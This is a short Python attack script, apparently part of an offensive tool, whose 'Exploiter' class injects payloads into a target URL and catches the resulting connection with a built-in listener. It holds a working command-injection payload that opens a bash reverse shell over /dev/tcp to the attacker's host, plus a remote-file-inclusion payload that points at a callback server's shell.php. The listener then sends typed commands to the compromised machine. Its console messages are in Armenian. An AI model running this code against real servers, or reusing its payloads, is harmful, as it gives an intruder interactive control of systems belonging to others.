import socket
import threading
import requests
from typing import Optional

class Exploiter:
    def __init__(self, args):
        self.args = args
        self.lhost = args.lhost
        self.lport = args.lport
    
    def exploit(self, url: str, technique: str, payload: str) -> None:
        if not self.lhost or not self.lport:
            print("Օգտագործման համար պահանջվում է lhost և lport")
            return
        
        listener_thread = threading.Thread(target=self.start_listener)
        listener_thread.start()
        
        if technique == "rfi":
            exploit_payload = f"http://{self.args.callback}/shell.php"
        elif technique == "cmd":
            exploit_payload = f";bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        else:
            return
        
        try:
            requests.get(url.replace(self.args.placeholder, exploit_payload), timeout=5)
        except requests.RequestException:
            pass
    
    def start_listener(self) -> None:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.lhost, int(self.lport)))
            server.listen(1)
            print(f"Հետադարձ shell reverse միացված է {self.lhost}:{self.lport}")
            
            conn, addr = server.accept()
            print(f"Միացում {addr}")
            
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(data.decode(), end="")
                
                cmd = input()
                conn.send((cmd + "\n").encode())
            
            conn.close()
            server.close()
        except Exception as e:
            print(f"Միացման սխալ: {e}")
